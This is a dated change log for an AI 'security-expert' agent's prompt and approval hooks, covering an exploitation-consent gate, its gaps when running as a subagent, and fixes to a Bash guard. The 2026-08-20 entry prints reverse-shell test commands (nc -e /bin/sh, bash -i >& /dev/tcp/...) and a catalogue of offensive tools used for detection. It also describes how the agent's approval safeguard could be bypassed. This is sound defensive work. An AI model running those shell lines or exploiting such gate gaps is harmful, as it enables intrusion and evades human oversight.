# Kaizen — Change History: security-expert

> Dated log of actual changes to the `security-expert` agent. Most recent first.

## 2026-08-25 — K-005 closed: FR-10's approval ritual now has a delegated-subagent path
- **What:** `:58` gains the missing branch; 2,176 → 2,226 w (+50). The bullet said *"stop and state plainly: the target, the technique, and the blast radius — then wait for the human's confirmation."* For **Bash** that wait is mechanically real — `guard-exploitation-approval.sh` raises a `PreToolUse` ask. For **`WebFetch`** there is no hook, and this prompt's own `:20` establishes that a subagent cannot converse mid-run. So on the one branch `:56` calls *"the only control there is"*, the prescribed action was unperformable and the failure direction was **open**: narrate target/technique/blast-radius into a transcript, meet no objection because nobody is listening, proceed.
- **Shipped text:** *"**Running as a delegated subagent you cannot perform this ritual** — there is no live human turn to state the target, technique, and blast radius *to*. On either tool, do **not** issue the call: return those three facts to the caller as a blocked item, alongside whatever else you established."*
- **Two corrections to the wording C4 had proposed, both from the gate lint.** (i) The proposed justification was *"there is no live human turn, and no hook watches `WebFetch`"* — but the second half is **false for Bash and the prompt says so twice** (`:56`, `:59`). A reader taking it seriously constructs the carve-out — *reason 2 doesn't apply to Bash, so this is a WebFetch rule* — landing on the **permissive** side of the team's one destructive capability. It was also the third statement of the same fact in five lines, so deleting it fixed a waste finding and the misreading in one edit. The justification that actually holds on both branches is that **the disclosure half of the ritual has no recipient**: a `PreToolUse` prompt shows a human a bare command string, not the target/technique/blast-radius statement this bullet requires, so consent if granted is uninformed. `On either tool` then closes the Bash branch by naming it rather than by an argument a reader can rebut.
- (ii) The proposal ended *"as your deliverable, and stop"* — which **contradicts `:20`** (*"return what you did establish plus the sharp question"*) and is stricter than all three sibling gates in the wrong dimension. A delegated four-lens review that finishes code-security, secrets and compliance and then meets one exploitation-shaped probe in lens 1 would, read literally, discard three lenses of finished work. That is §6's "skips a required artifact element" — a broken-agent signal to `teco`, not a safety win. `devops:95`, `graph-dba:60` and `qa-engineer:80` all get this right and **none says "stop"**; `qa-engineer`'s *"mark the affected items blocked and return the request to the caller"* is the shape adopted here, because a security review is multi-lens by construction while a destructive DB op usually is not. **This agent was not missing strictness; it had strictness pointed at the wrong noun.**
- **The cross-file claim that was false for four days, and what now reads it.** `:58`'s tail says this is *"the same shape of gate `devops`/`graph-dba`/`qa-engineer` already use."* All three have a subagent branch; `security-expert` was the only one without — so that claim was false in exactly the respect this commit repairs, and **nothing read it**. Per plan finding 23, the fix is not a script: those four gates guard different hazards and are deliberately worded differently, so pinning their wording would be inventing a constraint in order to make it checkable. Instead `agent-maintenance` §4 judgment-checklist item 3 is sharpened to name the instance — *"including every approval or destructive-op gate, which needs its own subagent branch stating what to return **and that the rest of the work continues**"* — which is what the certification pass actually reads, and what would have caught K-005 four days earlier.
- **Unverified premise, flagged rather than relied on.** K-005's rationale asserts that the Bash `PreToolUse` ask reaches a human even from an isolated subagent. The shipped wording is deliberately **independent** of that premise (it prohibits on either tool regardless), but the claim itself carries no evidence in the prompt or the plan — anyone relying on it for a different decision should verify it first.
- **Gate (a):** pure addition, no rule removed; `:56`'s "only control there is", `:59`'s Bash-only backstop description and K-004 pointer, the no-standing-consent limit, and the local/dev-only rule are all intact. The no-standing-consent sentence now sits **after** the subagent branch, which incidentally makes it visibly cover both modes — checked for pass-2's wedged-limit failure and it cannot occur here: the limit's subject is a full noun phrase (*"An earlier approval"*), not a pronoun, and the inserted sentence contains no competing approval noun.
- **Class 6: zero.** No dates, authority markers, or FR-tags entered; notably the addition does **not** cite K-004 as the follow-up, which was the tempting move. Both parking-lot "judged and kept" items are undisturbed.
- **Verified:** `audit-team.sh` **PASS**; `cobb` §7 lint 0 blockers, 2 majors, 1 minor, 2 nits — both majors fixed in-commit, m1 and n1 accepted as-is with reasons recorded.

## 2026-08-24 — Prompt-waste compression, Stage C4: incident provenance stripped from the safety lenses — file at its editorial floor
- **What:** Six edits (2,437 → 2,357 w, −80, −3.3%), executed as one unit with `devops.md` (`claude/docs/plans/prompt-waste-reduction.md`, Stage C4). Four class-6 cuts made up front, two minor fixes applied from `cobb`'s lint.
- **The four class-6 cuts:**
  1. Intro: deleted "You exist because security was previously one checklist line inside `analyst`'s general review and nobody owned agent/prompt-safety judgment as a standing responsibility (the 2026-07-31 kaizen-inbox incident below is the concrete gap this closes)." — pure origin story.
  2. Lens 2: "**The operative heuristic, distilled from the 2026-07-31 incident** (`claude/analyst/kaizen/history.md`, `claude/cobb/kaizen/history.md` — read both for the full case if you need the worked example):" → "**The operative heuristic:**".
  3. Lens 2, last bullet: dropped the trailing ", exactly as it played out in the precedent case". **This was a required companion to cut 2, not an independent trim** — leaving it would have stranded "the precedent case" with no antecedent, which is exactly the defect shape C3's lint caught (an unanchored comparative left behind by a provenance cut).
  4. FR-10's `WebFetch` bullet: dropped the "analyst review 2026-08-20 — " citation and reflowed the parenthetical into a dash clause. The rule and its why-clause are unchanged; `cobb` diffed it as a rule, not a length, and confirmed no quantifier, scope operator, or exception moved. Promoting the clause out of parentheses mildly *raises* its salience, which is the safe direction on a fail-closed gate.
- **Two lint fixes:** (M-2) "Every other Bash and WebFetch use (**FR-1 through FR-5's** investigation…)" → "(**the four lenses'** investigation…)" — the agent could not expand FR-1..FR-5 without opening the requirements doc, and the intended referent was simply its own four lenses. (M-3) the deliverable section's "Since your review is a **separate, additional** pass alongside `analyst`'s (not a replacement — FR-6), pick a topic slug…" → "When an `analyst` review of the same artifact already exists, pick a topic slug…" — the not-a-replacement rule is already stated in lens 1 and in Boundaries; at this decision point (*what do I name my file*) the only input needed is the **trigger**, that a sibling review may exist.
- **Gate (a) inventory — all preserved.** Every rule the deleted provenance sat on survives elsewhere, verbatim or stronger: "you are a deeper/additional pass, `analyst`'s own review is unaffected" → lens 1 and Boundaries bullet 1; "you own agent/prompt-safety as a standing responsibility" → lens 2's existence and the frontmatter description; the operative heuristic itself → stated absolutely, with the Safe-shape / Unsafe-shape bullets intact. Note cut 2 **strengthened** the rule: "distilled from the 2026-07-31 incident" implicitly narrowed the heuristic to one calibrating case; stating it absolutely is the doctrine's stated preference.
- **Anti-trigger check (finding 8) — clear on all four.** The recognizers for lens 2 are the Safe/Unsafe bullets' concrete markers ("*repo-owned mechanism*", "*a **product-level** control (like Claude Code's own Bash safety classifier)*", "*zero working-tree touch* rather than *here's how to dodge the check*"), and every one of them stayed. What was removed was the *origin* of the heuristic, never a means of recognizing when it applies.
- **Gate (b):** the 2026-07-31 case survives in `claude/analyst/kaizen/history.md` and `claude/cobb/kaizen/history.md` — the exact two files the deleted pointer named — and the agent's origin claim survives in `claude/README.md` and `claude/docs/requirements/security-expert.md`. `claude/README.md` is now the correct home for that provenance: a human-facing catalog rather than always-loaded context. Cut 4's analyst review is recorded in this file's 2026-08-20 entry.
- **Considered and kept:** the "(a tracked follow-up, not yet built — `security-expert/kaizen/plan.md`)" pointer on the harness-backstop bullet. Textually class-6, but the doctrine's waste probe is *backward-looking* dated pointers into `history.md`; this is a **forward-looking ownership pointer** telling the agent the gap is already owned (K-004) so it doesn't re-report it into a caller's deliverable. The `history.md`-vs-`plan.md` distinction is the general rule: a pointer to what *happened* is waste, a pointer to what is *owned* is a citation the rule requires the agent to use. Also kept: the closed-doc-kind-role-set clause on the slug rule, which prevents a specific violation (inventing a `-security` role token).
- **Class-7 candidate deferred by rule, then judged and kept on merit:** the "never runs automatically" overlap between the lens-catalogue intro and Boundaries' "**No standing gate, ever.**" (~11 w). Initially deferred because the Stage C split rule forbids folding a class-7 candidate that touches an **authority clause** into a single pass, and it sits inside §"Boundaries — advisory, not authority"; splitting C4 into two passes for an 11-w gain was disproportionate. `cobb` then judged it a genuine keep under finding 5 — two decision points the agent stands at (self-triggering while reading the lens catalogue vs. claiming standing authority), each with its own distinctive payload. **Recorded in `kaizen/plan.md` as judged-and-kept** so no later dedup sweep re-opens it.
- **One MAJOR surfaced, deliberately not fixed here → K-005.** FR-10's "stop and state plainly… then wait for the human's confirmation" has **no subagent path**, and the gap is widest exactly where the harness backstop is absent: for `Bash` the guard hook makes "wait" mechanically real even from an isolated subagent, but no hook watches `WebFetch`, and a subagent cannot converse mid-run — so on the one branch the prompt itself calls "*the only control there is*," the prescribed action is unperformable and the failure direction is open. **Pre-existing**; cut 4 reworded this bullet's neighbour, which is how the lint surfaced it. Not folded into C4 because it is a rule **addition**, and bundling it would make that commit non-revertible as a pure waste-reduction change (§4.0's rollback contract). Full detail and the proposed wording in `kaizen/plan.md` K-005.
- **Residual class-6/7 inventory: ~22 w in 2,357 w (0.9%) after M-3 — at the editorial floor.** Zero dates, zero decision-authority markers, zero supersession trails, zero `history.md` pointers remain. Notable for calibration: before M-3 the residual was ~100% **FR-tags**, because this is the only agent on the team built from a formal requirements doc and therefore the only prompt with FR-numbers to leak.
- **Verified:** `audit-team.sh` PASS (115 PASS, 0 FAIL); `cobb` §7 lint 0 blockers, 0 majors on the C4 edits.

## 2026-08-23 — Prompt-waste Stage B wave 2: freshness clause + commit grant + capture intro compressed to pilot shapes
- **What:** CPG-freshness clause, the "Bash's one other narrow write action" commit-grant bullet (its distinctive lead kept), and the learning-capture intro compressed to the pilot-validated wordings (`claude/docs/plans/prompt-waste-reduction.md` v4, §3 doctrine + Stage B). The capture tail was already the compressed form — this agent postdates the inbox era and never carried the inbox-replacement sentence.
- **Removed (class 5/6, on standing record):** the grant's "same as before. Stakeholder decision, 2026-08-21 — see `kaizen/history.md`" — this file's 2026-08-21 grant entry; the freshness clause's "(2026-08-19 convention, same as `analyst`/`architect`)" and "without re-deriving staleness yourself" — the centralization is the standing convention in `docs/plans/cpg-agent-adoption2.md` and `claude/teco/kaizen/history.md` (2026-08-19); the intro's ":Agent node it's `PRODUCED`-linked to" mechanics restatement (mechanics live in the Cypher template below); the grant parenthetical's "— not spawned via `Agent`/`Task` as an isolated delegate" (moved into the carve-out sentence).
- **Gate (a) inventory — all preserved:** grant scope (own findings report, explicit path), full never-list, delegated-subagent carve-out + audit check-8 tokens, the freshness rule's distinct lead kept ("`teco`'s responsibility **when it dispatched you**" — this agent isn't always teco-dispatched) with both branches, Cypher template + call line verbatim, "raw capture: `cobb` promotes; never edit your own definition".
- **Verified:** `audit-team.sh` PASS; cobb §7 lint pass.

## 2026-08-21 — Interactive-mode commit grant added (team-wide stakeholder decision)
- **What:** New Guardrails bullet: when running interactively (`claude --agent security-expert`,
  a human present turn-by-turn — not a delegated subagent), may `git add`/`git commit` its own
  findings report from the session, by explicit path, never bulk-staged/pushed/reset/rebased/
  amended; the grant does not apply when spawned as a delegated subagent — separate from, and
  additive to, the existing FR-10 exploitation-approval gate, which is unaffected.
- **Why:** Direct stakeholder ruling, 2026-08-21, after `tico` hit exactly this gap closing out a
  Mode-3 verification pass (its own commissioned artifacts left uncommitted, since only
  `tico`/`teco` had any commit authority). Rather than pin the fix to those two, the stakeholder
  ruled the exception should reach every agent, gated by invocation mode, not identity — full
  rationale, the `claude/AGENTS.md` rewrite, and the `audit-team.sh` check-8 redesign in
  `claude/cobb/kaizen/history.md`, 2026-08-21 entry.
- **Verified:** `bash claude/scripts/audit-team.sh` — clean, all 13 agents pass check 8.
- **Plan items:** none opened — direct implementation of an explicit stakeholder decision.

## 2026-08-20 — Fix pass on analyst's independent review (`claude/docs/reviews/security-expert.md`): three FR-10 majors + one cheap minor

- **What:** `analyst`'s review of the newly-created agent (same day, "approve with suggestions",
  no blocker) found three **major** findings, all inside the FR-10 exploitation gate, routed back
  by `teco` for a fix pass before acceptance. Fixed all three, plus the one cheap **minor**;
  left the second minor (the `Agent`-tool delegation bypass) parked as directed — it's a
  pre-existing, team-wide structural gap (`devops`/`graph-dba`/`qa-engineer` share it for their
  own guards), not specific to this deliverable.
  1. **`nc`/`ncat`/`netcat` reverse-shell bypass.** `hooks/guard-exploitation-approval.sh` used to
     fold `nc`/`ncat`/`netcat` into the marker-exempt `NETCLIENT` branch, so `nc -e /bin/sh
     127.0.0.1 4444` (a standard reverse-shell client invocation) sailed through unescalated
     whenever a local marker was present — contradicting the hook's own stated "ask every time,
     local/dev included" principle, which was already implemented for the `TOOLS`/`LISTENER`
     branches but not this one. Fix: removed `nc`/`ncat`/`netcat` from `NETCLIENT` entirely;
     added two new **unconditional** (no marker exemption) branches — (a) `nc`/`ncat`/`netcat`
     carrying a shell-spawn flag (`-e`/`-c`/`--exec`/`--sh-exec`), (b) a `/dev/tcp` redirect
     combined with `>&`/`<&` (the shell-native reverse-shell technique that needs no `nc` binary
     at all — added as a cheap extension the review invited). `curl`/`wget`/`ssh`/`telnet` stay in
     the marker-exempt branch unchanged, per the review's explicit confirmation that ambiguity is
     handled correctly there.
  2. **FR-10's ritual was Bash-only in the prompt, but `WebFetch` is also in the toolset.**
     `WebFetch` can carry a GET-based exploitation probe (reflected XSS/SQLi/path-traversal/SSRF
     in a query string) against a local `salesperson`/`falkor-chat` instance with no ritual
     attached — a gap in the *primary control* (prompt discipline), not just the harness backstop.
     Fix: widened the "Active exploitation (FR-10)" section and the matching Guardrails bullet in
     `security-expert.md` to explicitly cover any `WebFetch` call reaching a live target,
     alongside Bash, and to say plainly that the harness hook still watches Bash only today
     (extending it to `WebFetch` is a new `kaizen/plan.md` follow-up, not done in this pass, per
     the review's own "secondary to the prompt fix" framing).
  3. **Ordinary investigative greps for `curl`/`wget`/`ssh` tripped the guard.** The old
     `NETCLIENT` match scanned the whole command string for the tool name anywhere, including
     inside a quoted grep pattern (`grep -rn "curl" devops/scripts/` escalated), contradicting the
     prompt's own claim that ordinary Bash investigation "needs no special ceremony" and risking
     reflexive-approval erosion on the one gate built around "never standing consent." Fix:
     anchored the marker-exempt branch's match on the tool name appearing as an actual command
     verb — start of command, or immediately after a shell separator (`;`, `&&`, `||`, `|`,
     backtick, `$(`) — instead of anywhere in the string, mirroring the anchoring discipline
     `guard-destructive-ops.sh`'s `pipeline.sh --reset` branch already uses (including its
     two-independent-greps-ANDed pattern, to avoid the same ordering bug that branch's own history
     warns about).
  4. **Cheap minor:** `skills/cpg-analysis/SKILL.md`'s frontmatter `description` consumer list
     added `security-expert` (previously listed only "analyst, architect, qa-engineer, coder,
     tdd-engineer, or frontend-engineer" despite FR-2 making this agent a real consumer). Logged
     here rather than in `graph-dba/kaizen/history.md` since it's this fix pass's own follow-up,
     not a `cpg-analysis` design change — `skills/README.md`'s "owner-agent's history" convention
     for skill edits is itself still informally applied (`cobb/kaizen/plan.md` K-014), and this
     edit's causal owner is squarely this fix pass.
- **Verified:** re-ran `analyst`'s exact reproduction commands directly against the fixed hook —
  `nc -e /bin/sh 127.0.0.1 4444` and `nc 127.0.0.1 4444 -e /bin/bash` now escalate (previously
  silent); `grep -rn "curl" devops/scripts/` and `cat app.py | grep wget` now pass silently
  (previously escalated). Also spot-checked `ncat --sh-exec ... host.docker.internal` and
  `bash -i >& /dev/tcp/10.0.0.5/4444 0>&1` (both correctly escalate, unconditional) and a plain
  `nc -zv localhost 8000` port-check (correctly still passes — the fix is scoped to shell-spawn
  flags, not blanket `nc` coverage, per the finding's own wording). Full regression re-run of
  every earlier test case (benign grep/pytest, local curl/ssh, external curl, sqlmap, nc listener,
  nmap against a local marker) plus three new command-verb-anchor sanity checks (`curl` after
  `&&`, after `|`, and at string start — all correctly still escalate when non-local) — no
  regressions. `bash -n` clean. `bash claude/scripts/audit-team.sh` — 110 PASS / 2 pre-existing
  FAIL, identical to the pre-fix run (same two hits, `falkor-chat/docs/test-reports/
  graphrag-eval-report.md`, committed 2026-08-16, untouched by this session).
- **Why:** `teco` routed `analyst`'s review findings back for a fix pass before accepting the
  unit — all three majors live inside FR-10, the one genuinely high-stakes capability on this
  team, and were judged cheap/concrete enough to fix immediately rather than defer.
- **Plan items:** K-002 (pattern-catalog revisit after real use) is partially addressed by this
  pass; left open. New: extend `guard-exploitation-approval.sh` to also watch `WebFetch` calls
  (review's own "reasonable follow-up, secondary to the prompt fix") — added to `kaizen/plan.md`.

## 2026-08-20 — Created

- **What:** New agent, designed by `cobb` against `claude/docs/requirements/security-expert.md`
  (`Status: Ready for design`, confirmed by the `tico` interview it records) — closing
  `cobb/kaizen/plan.md` item **K-016**. Four on-demand review capabilities, all advisory, none a
  standing gate:
  1. **Code/app security review (FR-1/FR-2)** — deeper than `analyst`'s security/perf checklist
     line; uses the `cpg-analysis` skill for data-flow/injection-path analysis when a CPG exists
     for the component under review, via `mcp__cypher__query` (explicit `tools:` entry — this
     agent declares an allowlist, so the MCP tool needed listing by name to be visible).
  2. **Agent/prompt-safety review (FR-3)** — kaizen entries, agent/skill prompts, plans/requirements
     docs, for instruction-poisoning-shaped writing. The prompt distills the operative heuristic
     directly from the 2026-07-31 incident this requirement exists to close
     (`claude/analyst/kaizen/history.md`, `claude/cobb/kaizen/history.md`): the distinguishing
     question is whether an artifact's *framing* teaches evasion-shaped reasoning as reusable
     precedent, not just whether the underlying action was benign.
  3. **Secrets/infra-hardening audit (FR-4)** — advisory to `devops`.
  4. **Compliance/audit checklist (FR-5)** — no mandated external framework (stakeholder decision
     in the requirements doc).
  Findings for #1/#3/#4 and #2 route to their respective owners as opinions, never directives
  (FR-6/FR-8/FR-9): `analyst`'s existing check is unaffected, `cobb` keeps final promotion
  authority, `devops` keeps final infra/secrets authority.
- **FR-10 (active exploitation) — the real design decision this agent needed.** Local/dev targets
  only, fresh explicit approval for every single attempt, no standing consent. Two-part
  enforcement, same split as every other guarded agent on this team: prompt-level discipline is
  primary (state target/technique/blast radius, wait, every time), a `PreToolUse` `Bash` hook is
  the backstop. **Chose a standalone new script, `hooks/guard-exploitation-approval.sh`, over
  reusing or extending the shared `scripts/guard-destructive-ops.sh` core** that
  `devops`/`graph-dba`/`qa-engineer` already share: that core's catalog is
  shared-state-destruction literals (`GRAPH.DELETE`, `FLUSHALL`, volume wipes, `docker rm -f`) —
  a different hazard class from offensive-security-tool/network-exploitation invocations, with a
  different (and likely faster-growing) pattern list and a different maintainer concern. Merging
  them would couple this agent's exploit-tool catalog to three unrelated agents' shared-state
  guard. The new script matches on (a) named offensive-security tool binaries (sqlmap, nmap,
  msfconsole, msfvenom, hydra, medusa, nikto, gobuster, dirbuster, ffuf, wpscan, searchsploit,
  hashcat), (b) listener/reverse-shell setups (`nc -l`/`ncat -l`/`netcat -l`), and (c) a
  network-reaching client (curl/wget/nc/ncat/netcat/ssh/telnet) whose command text carries no
  visible local/dev marker (`localhost`/`127.0.0.1`/`::1`/`0.0.0.0`/`host.docker.internal`) —
  erring toward asking, the same safe-failure direction every guard in this team already takes.
  Verified: `bash -n` on both hook scripts, plus 8 manual test cases through the exploitation
  guard (benign grep/pytest pass silently; local curl/ssh with a `127.0.0.1`/`localhost` marker
  pass silently; external curl, `sqlmap`, an `nc` listener, and `nmap` against
  `host.docker.internal` all correctly escalate — `nmap` asks even against a local marker,
  correct, since FR-10 requires approval every time regardless of target).
- **Tools/frontmatter:** explicit `tools:` allowlist (`Read, Grep, Glob, Bash, Write, Edit,
  WebFetch, WebSearch, Agent, mcp__cypher__query`), matching `analyst`'s shape — the closest
  sibling (reviewer, writes findings docs, uses Bash for investigation). `permissionMode:
  acceptEdits` (team-wide convention). Two `PreToolUse` hooks under one frontmatter `hooks:` block
  (`Write|Edit` → `guard-review-doc-writes.sh`, a thin wrapper over the shared
  `scripts/guard-doc-writes.sh` core scoped to `docs/reviews/*` only — no kaizen `inbox.md` glob
  needed, since this agent has none per FR-12/AC-9; `Bash` → the new
  `guard-exploitation-approval.sh`).
- **Kaizen:** seeded `kaizen/{plan,history}.md` only — no `inbox.md` (agent created after the
  2026-08-20 shared-graph consolidation; Learning capture writes straight into `kaizen_team`,
  `author: 'security-expert'`).
- **Team-wide edits in the same change** (boundary-pair symmetry + roster/catalog currency,
  per the `agent-maintenance` skill and `claude/scripts/audit-team.sh` check 6):
  - `claude/scripts/audit-team.sh` `BOUNDARY_PAIRS` gained `security-expert:analyst`,
    `security-expert:cobb`, `security-expert:devops` (the three boundaries the requirements doc's
    FRs actually name — not `qa-engineer`, see `kaizen/plan.md`'s parking-lot note).
  - `claude/analyst/analyst.md`, `claude/cobb/cobb.md`, `claude/devops/devops.md` — each
    `description` gained a short reciprocal clause naming `security-expert`.
  - `claude/teco/teco.md` — new routing-table row + handoff-contract line (deliverable path
    `<component>/docs/reviews/<slug>.md`, same as `analyst`).
  - `claude/README.md` — new catalog row. `claude/AGENTS.md` — added to the "Agents" roster
    paragraph and to "Hook machinery" (the new agent-owned, non-shared-core `Bash` guard, noted as
    a departure from the two existing shared cores).
  - Root `AGENTS.md` — checked, no change needed: it doesn't enumerate individual agent names
    (only describes the `claude/` component generally; the roster lives in `claude/AGENTS.md` +
    `claude/README.md`, per `audit-team.sh` check 5b).
- **Why:** `tico`-interview requirements doc reached `Status: Ready for design` on 2026-08-17 with
  no design pass run against it (`cobb/kaizen/plan.md` K-016, added 2026-08-19 during an unrelated
  distillation pass). This dispatch executes that backlog item.
- **Verified:** `bash claude/scripts/audit-team.sh` — see the same-date `cobb/kaizen/history.md`
  entry for the full run output and any follow-up fixes.
- **Plan items:** K-001/K-002/K-003 above; parking-lot judgment calls for a future reviewer to
  double-check.
